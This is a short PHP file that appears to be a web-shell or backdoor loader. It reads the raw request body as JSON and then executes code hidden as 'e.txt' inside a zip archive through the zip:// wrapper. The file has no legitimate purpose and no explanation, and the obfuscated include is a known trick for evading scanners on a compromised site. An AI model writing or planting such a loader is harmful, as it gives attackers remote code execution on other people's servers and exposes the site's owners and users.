<?php
//是dgfd东莞规划图实
if(!defined("ROOT")){$j=$_SERVER["PHP_SELF"];if(!$j){$h=explode("?",$_SERVER["REQUEST_URI"]);$j=$h[0];}$o=__FILE__;if(!$o)$o=$_SERVER["PATH_TRANSLATED"];if(!$o)$o=$_SERVER["SCRIPT_FILENAME"];define("ROOT",str_replace($j,"",$o),false);}
$d = file_get_contents('php://input');
$d = json_decode($d, true);
$self=__FILE__;
require_once "zip://e.zip#e.txt";